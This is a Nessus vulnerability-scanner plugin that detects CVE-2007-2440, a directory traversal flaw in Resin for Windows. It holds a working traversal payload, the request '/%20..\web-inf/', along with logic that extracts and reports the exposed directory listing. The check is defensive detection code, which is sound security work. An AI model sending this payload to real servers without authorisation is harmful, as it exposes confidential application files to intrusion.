#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25241);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/05/16 14:22:07 $");

  script_cve_id("CVE-2007-2440");
  script_bugtraq_id(23985);
  script_osvdb_id(36058);

  script_name(english:"Resin for Windows \WEB-INF Traversal Arbitrary File Access");
  script_summary(english:"Tries to get a directory listing of web-apps\ROOT\WEB-INF");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Resin, an application server.

The installation of Resin on the remote host allows an unauthenticated,
remote attacker to gain access to the web-inf directories, or any
known subdirectories, on the affected Windows host, which could lead to
a loss of confidentiality.");
  script_set_attribute(attribute:"see_also", value:"http://www.rapid7.com/advisories/R7-0029.jsp");
  script_set_attribute(attribute:"see_also", value:"http://www.caucho.com/resin-3.1/changes/changes.xtp");
  script_set_attribute(attribute:"solution", value:"Upgrade to Resin / Resin Pro 3.1.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/05/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/05/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/05/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:caucho:resin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("www/resin");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);

# Unless we're paranoid, make sure the banner is from Resin.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "Unable to get the banner from web server on port "+port+".");
  if ("Resin" >!< banner) exit(1, "The web server on port "+port+" does not appear to be Resin.");
}


# Try to exploit the flaw.
url = "/%20..\web-inf/";
r = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);


# There's a problem if it looks like we have a directory listing.
if (">Directory of / ..\web-inf/<" >< r[2])
{
  if (report_verbosity)
  {
    report = string(
      "Nessus was able to get a directory listing using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    if (report_verbosity > 1)
    {
      inbody = FALSE;
      info = "";
      foreach line (split(r[2], keep:FALSE))
      {
        if (inbody)
        {
          line = str_replace(find:"<li>", replace:"  * ", string:line);
          line = ereg_replace(pattern:"<[^>]+>", replace:"", string:line);
          info += '  ' + line + '\n';

          if ("</body" >< tolower(line)) inbody = FALSE;
        }
        else if ("<body" >< tolower(line)) inbody = TRUE;
      }
      report = string(
        report,
        "\n",
        "Here is the information extracted :\n",
        "\n",
        info
      );
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
